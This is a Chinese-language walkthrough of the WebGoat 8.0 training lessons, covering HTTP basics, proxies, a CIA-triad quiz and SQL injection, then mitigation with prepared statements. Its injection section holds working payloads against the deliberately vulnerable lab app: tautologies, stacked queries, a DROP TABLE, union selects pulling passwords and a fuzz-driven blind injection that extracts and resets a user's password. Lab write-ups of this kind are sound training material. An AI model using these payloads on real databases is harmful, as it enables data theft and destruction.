# Webgoat 8.0 writeup

## 通用部分
### HTTP Basics
这部分内容旨在介绍HTTP协议的基本内容，如何工作。

需要掌握的关键是：
- 客户端访问服务器时发送请求和获得响应的实质
- Get request
- Post request
- User-Agent
- Accept

在练习中，可以通过查看源码、打开开发者模式界面查看请求信息得到答案。

### HTTP Proxies

这部分介绍了使用代理，截获 web客户端与服务器之间的通信流量，对于部分内容进行修改的过程。

Proxies的功能很丰富，善加应用可以完成很多安全功能。

常用的Web代理：
- Burpsuite
- ZAP
- ...

课程中重点介绍了 Owasp ZAP 的安装使用，虽然很多人习惯使用Burpsuite，但ZAP是开源免费的，而且功能也很齐全。

Owasp ZAP 的代理设置在菜单 Tools-Options-Local Proxy 中设置。

Firefox 浏览器的代理设置在其高级设置中；Chrome浏览器的代理设置现在需要设置本地代理，麻烦一些。

设置完毕后，需要验证代理是否正常工作，即验证网页访问能被代理正常拦截，且能手动放行。

为了能够聚焦客户端到服务器的访问，访问页面中自己访问服务器的行为可以不关注，通过在代理中设置"exclude from"，不再阻止和观察这些流量，有助于我们集中注意力。例如，我们可以在 exclude from.. 窗口中增加设置：

```
http://localhost:8080/WebGoat/service/.*
http://localhost:8080/WebGoat/.*.lesson.lesson
```

题目不难，要注意大小写。

### CIA triad

CIA 原则是一个信息安全模型。这3个原则考虑了最为关键的信息安全嘴贱和所有系统都应该保护的方面。

1. How could an intruder harm the security goal of confidentiality?选c

Solution 1: By deleting all the databases.
Solution 2: By stealing a database where general configuration information for the system is stored.
Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
Solution 4: Confidentiality can't be harmed by an intruder.

2. How could an intruder harm the security goal of integrity?选a

Solution 1: By changing the names and emails of one or more users stored in a database.
Solution 2: By listening to incoming and outgoing network traffic.
Solution 3: By bypassing authentication mechanisms that are in place to manage database access.
Solution 4: Integrity can only be harmed when the intruder has physical access to the database storage.
3. How could an intruder harm the security goal of availability?选d

Solution 1: By exploiting bugs in the systems software to bypass authentication mechanisms for databases.
Solution 2: By redirecting emails with sensitive data to other individuals.
Solution 3: Availability can only be harmed by unplugging the power supply of the storage devices.
Solution 4: By launching a denial of service attack on the servers.
4. What happens if at least one of the CIA security goals is harmed?选b

Solution 1: A system can be considered safe until all the goals are harmed. Harming one goal has no effect on the systems security.
Solution 2: The systems security is compromised even if only one goal is harmed.
Solution 3: It's not that bad when an attacker reads or changes data, at least some data is still available, hence only when the goal of availability is harmed the security of the system is compromised.
Solution 4: It shouldn't be a problem if an attacker changes data or makes it unavailable, but reading sensitive data is not tolerable. Theres only a problem when confidentiality is harmed.

### Google chrome 开发者工具

console 可以运行JavaScript本地脚本。查看页面内容和其他信息。‘undifined'表示你调用的JavaScript函数没有返回任何东西。


打开console ，键入```webgoat.customjs.phoneHome()```，调用页面已加载的脚本函数，可以得到一个输出，把输出中的数字复制出来即可。

source 面板可以看源代码

network 面板可以看网络通信过程。

在network中观察form表单数据，就能得到答案。

## 注入缺陷

### sql注入-介绍

第一题，Try to retrieve the department of the employee Bob Franco.，键入sql语句：```select department from employees where first_name='Bob' and last_name='Franco'```

第二题，Try to change the department of Tobi Barnett to 'Sales'. 键入sql语句：```UPDATE employees SET department='Sales' where first_name='Tobi' and last_name='Barnett'```

第三题，try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees". :键入下列语句：
```ALTER TABLE employees ADD phone varchar(20);```


第4题，Try to grant the usergroup "UnauthorizedUser" the right to alter tables: 输入下列语句：```GRANT alter table TO UnauthorizedUser```


#### sql注入

sql注入会导致：
- 数据库中的敏感数据被读取和改动
- 数据库管理员权限操作
  - 关闭数据库
  - 关闭审计
  - 清除表和记录
  - 增加用户
- 恢复戈丁文件的内容
- 发现OS问题命令

第9题 try to retrieve all the users from the users table。
选```'```和```'1'='1```
。

#### Numeric SQL

第10题 Using the two Input Fields below, try to retrieve all the date from the users table.

两个输入框，分别键入：
- ```1```
- ``` 1 or '1'='1'```

数字型sql注入，特点就是录入的是数字，不需要加包含字符串的引号。

#### 字符型注入

字符型注入需要考虑引号了。

第11题，分别输入：
- 1' or '1'='1
- 1

#### 查询链

SQL 查询链就是一个跟在另一个查询后面。你可以使用标记查询结束的分号```;```这一元字符，它允许在一行中开始一个新的查询。
第一空输入Smith

第二空可以先用 ```3SL99A' ; select *  from employees where '1'='1``` 查一下表内情况。 然后再输入下列语句：


```3SL99A' ;UPDATE employees SET SALARY=99999 where LAST_NAME='Smith```


#### 破坏可用性

使用SQL注入的方法破坏机密性、完整性，也可以破坏可用性。

例如：
- 修改密码或用户名
- 取消某个用户的访问权限
- 删除部分或全部数据

第13题，To delete access_log table completely before anyone notices.

输入框中键入```1 ; select * from access_log```，提交后发现查询成功，但没有数据。

再次输入下列语句：```'; DROP TABLE access_log ;--```

### 高级 SQL 注入

- 结合型技术
- 盲注

题目6.a 键入命令```' OR '1'='1';  select * from user_system_data --```

也可以使用union语句完成：```' or 1=1  union select userid, user_name, password,cookie,'1','1',1 from user_system_data -- ```


题目6.b ```passW0rD```


题目"Can you login as Tom?"。这个题先注册一个用户（例如leo/123456)。

- 尝试正确登录leo/123456，然后会收到提示“Try To login as Tom!”
- 尝试错误Tom/123456，会反馈“No results matched. Try Again.”

可以看到查询正确与错误会有两种不同的反馈，但不会有更多的输出。

```leo' union select 1 or '1'='1```

```123456' or '1'='1```

Login入口测试了许久没有结果，但 Register 的用户名窗口存在注入可能，因为键入```tom' and '1'='2' ; --```可无限次的注册成功。

要以 tom 登录，考虑修改 tom的密码，但是现在不知道用户表的名字，所以可以利用服务器对条件真假的响应来看看这是一种什么数据库，是何版本的数据库。

尝试：```tom' and SUBSTRING('m',1,1)='m' ;--```，响应为：User tom' and SUBSTRING('m',1,1)='m' ;-- already exists please try to register with a different username.

再尝试 ```tom' and SUBSTRING('m',1,1)='n' ;--```，响应为：User tom' and SUBSTRING('m',1,1)='n' ;-- created, please proceed to the login page.说明可以正常执行，SUBSTRING()可用，而且可以再次测试小写的substring也可行，说明大小写不敏感。

支持 SUBSTRING()的数据库,可能是
- Mysql数据库
- MSSqlserver 
- SUBSTRING
- ...

尝试输入语句```tom' and SUBSTRING(VERSION(),1,1)='5' ;--```再看看版本是不是常见的5.x.xx。结果居然报“Sorry the solution is not correct, please try again.” 这应该是语句含有不支持的函数VERSION()，那么后台可能不是mysql。

替换上面的version()为database_version()。测试发现，支持database_version()函数，那么我们用owasp_zap 的fuzzer进行自动测试。使用fuzz中正则，表达式为 ```tom'\+and\+SUBSTRING\(database_version\(\)%2C\d%2C1\)%3D'\d'\+%3B--```

通过观察响应中的反馈提示，可知版本约为2.3.x

这是个什么数据库？网上查不到database_version()是哪个数据库的函数。莫非是只是一段程序，而不是某个应用级产品？OMG。

猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 还真是。

构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看哪些响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,原来是Java内置的数据库。

现在，我们可以查看相关手册，然后找系统表了。发现以下内置函数和属性：
- DATABASE ()
- USER ()
- CURRENT_SCHEMA
- CURRENT_CATALOG

利用下列fuzz：```tom'\+and\+SUBSTRING\(database\(\),[1-9],1\)='\w'\+;--```，发现数据库名就是你登录WebGoat8的用户名，果然是动态建的。




下列语句可执行，即可构造类似的select 返回 boolean 型值可以实现盲注。
```tom' and (SELECT True FROM information_schema.tables where table_type='VIEW' LIMIT 1) ; --```

将结果变成一个字符串，使用函数：group_concat(table_NAME)，那么可以构造如下语句(普通数据表的类型为"BASE_TABLE"，视图为"VIEW")：
```tom' and substring((SELECT group_concat(TABLE_NAME) FROM information_schema.tables  where table_type='BASE TABLE' and TABLE_SCHEMA='PUBLIC'),1,1)='a' ; --```

使用zap的fuzz功能，构造正则，可以得到大量表名：如：SERVERUSER, _DATAUSER，_LOGINPINUSER, SYSTEM, DATAPRODUCT，DATA, MESSSAGES, EMPLOYEE,ROLES,AUTH,OWNERSHIP, WEATHER,_DATATRANSACTIONS,USER...

优先尝试 EMPLOYEE 表，构造如下盲注语句，并利用fuzz进行自动请求发送

```tom' and substring((SELECT group_concat(COLUMN_NAME) FROM information_schema.columns where TABLE_NAME='EMPLOYEE' ),1,1)='a' ; --```

得到以下列名：USERID,FIRST_NAME,LAST_NAME,SSN, PASSWORD,TITLE,PHONE,ADDRESS1,ADDRESS2,MANAGER,START_DATE,SALARY,CCN...

为了确定这个表里有tom，还可以构造下列类似语句测试。

```tom' and substring((SELECT group_concat(FIRST_NAME) FROM EMPLOYEE where FIRST_NAME='Tom' ),1,1)='T' ; --```

确定表找对了，那么就可以看看密码是什么了，构造如下语句并在1和‘a’处构造fuzz。

```tom' and substring((SELECT group_concat(PASSWORD) FROM EMPLOYEE where FIRST_NAME='Tom' ),1,1)='a' ; --```

发现密码为"tom"。本以为完成了，结果提交不了。听说要给他修改密码，那么就试试下面的语句。

```tom' and (update EMPLOYEE set PASSWORD='123456'   where FIRST_NAME='Tom' ) ; --```

修改经过验证是成功的，但使用tom/123456还是提交不了，怪了。

好奇之下，我用下面语句作为基础，fuzz一下看有哪些用户名，确实只有一个Tom。

```tom' and substring((SELECT group_concat(FIRST_NAME) FROM EMPLOYEE),1,1)='a' ; --```

奈何，提交答案是错的。读者可以参考网上答案。

### sql injection (mitigation)

#### 有免疫力的查询
防御sql注入最好的方法如下（不接收数据或将数据作为某个列的单独实体，而不去解释他）：

##### 静态查询
例如：```select * from products``` 语句中不接受任何输入值。

又例如：```select * from users where user = "'" + session.getAttribute("UserID") + "'";``` 输入值与UserID绑定。

##### 预编译查询
使用预编译语句可以较好防御sql注入，因为在预编译语句中的输入参数值，不会再被sql编译器解释。

```sql
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
```

##### 存储过程

仅当存储过程不能生成动态sql时，可以使用存储过程避免注入问题。

安全的存储过程例如(Microsoft SQL Server)：
```sql
CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
AS
SELECT City, COUNT(*)
FROM Customers
WHERE Country LIKE @Country GROUP BY City

EXEC ListCustomers ‘USA’
```

可注入的存储过程举例(Microsoft SQL Server):
```sql
CREATE PROEDURE getUser(@lastName nvarchar(25))
AS
declare @sql nvarchar(255)
set @sql = 'select * from users where
            LastName = + @LastName + '
exec sp_executesql @sql
```
上面的@sql是一个动态的sql语句，可以被替换为注入内容。

#### 参数化的查询

以 Java 代码片段（Snippet）为例
```java
public static bool isUsernameValid(string username) {
    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
    return r.isMatch(username);
}

// java.sql.Connection conn is set elsewhere for brevity.
PreparedStatement ps = null;
RecordSet rs = null;
try {
    pUserName = request.getParameter("UserName");
    if ( isUsernameValid (pUsername) ) {
        ps = conn.prepareStatement("SELECT * FROM user_table
                                   WHERE username = ? ");
        ps.setString(1, pUsername);
        rs = ps.execute();
        if ( rs.next() ) {
            // do the work of making the user record active in some way
        }
    } else { // handle invalid input }
}
catch (…) { // handle all exceptions … }

```

使用预编译查询的JAVA实例：

```java
public static String loadAccount() {
  // Parser returns only valid string data
  String accountID = getParser().getStringParameter(ACCT_ID, "");
  String data = null;
  String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
  try (Connection connection = null;
       PreparedStatement statement = connection.prepareStatement(query)) {
     statement.setString(1, accountID);
     ResultSet results = statement.executeQuery();
     if (results != null && results.first()) {
       results.last(); // Only one record should be returned for this query
       if (results.getRow() <= 2) {
         data = processAccount(results);
       } else {
         // Handle the error – Database integrity issue
       }
     } else {
       // Handle the error – no records found }
     }
  } catch (SQLException sqle) {
    // Log and handle the SQL Exception }
  }
  return data;
}
```

.NET 参数化查询实例：
```C#
public static bool isUsernameValid(string username) {
	RegEx r = new Regex(“^[A-Za-z0-9]{16}$”);
	Return r.isMatch(username);
}

// SqlConnection conn is set and opened elsewhere for brevity.
try {
	string selectString = “SELECT * FROM user_table WHERE username = @userID”;
	SqlCommand cmd = new SqlCommand( selectString, conn );
	if ( isUsernameValid( uid ) ) {
		cmd.Parameters.Add( "@userID", SqlDbType.VarChar, 16 ).Value = uid;
		SqlDataReader myReader = cmd.ExecuteReader();
		if ( myReader ) {
			// make the user record active in some way.
			myReader.Close();
		}
	} else { // handle invalid input }
}
catch (Exception e) { // Handle all exceptions… }
```

#### 使用预编译语句查询后还需要做输入校验么？
当然需要。

因为还有别的注入可能，例如：
- 存储型XSS
- 信息泄露
- 逻辑错误
- 其他未知sql注入

#### Order by子句

预编译查询能阻止所有的sql注入么？答案是否定的。

看下面的例子：

```select * from users order by lastname;```

SQL语法如下:

```SQL
SELECT ...
FROM tableList
[WHERE Expression]
[ORDER BY orderExpression [, ...]]

orderExpression:
{ columnNr | columnAlias | selectExpression }
    [ASC | DESC]

selectExpression:
{ Expression | COUNT(*) | {
    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
} ([ALL | DISTINCT][2]] Expression) } [[AS] label]

Based on HSQLDB
```

上面的语法意味着 order 表达式可以是一个 select 表达式。所以使用case语句可以文数据库一些问题。

例如：```select * from users order by ( case when (true) then lastname else firstname)```

所以，我们能提交任何boolean操作在 ```when(...)``` 部分。这个语句可以执行，因为它是一个有效的查询，即便你使用了预编译的sql语句，或者即便你的语句中没有定义order子句。

假如你需要提供一个排序功能，你需要设立一个白名单验证功能，验证order by语句，防止它出现意外。
#### 练习

例子需要补全的安全代码如下：
```java

Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
PreparedStatement ps = conn.prepareStatement("SELECT status FROM users WHERE name= ? AND mail=?");
ps.getString(1,name);
ps.getString(2,mail);
//ResultSet rs = ps.executeQuery();

```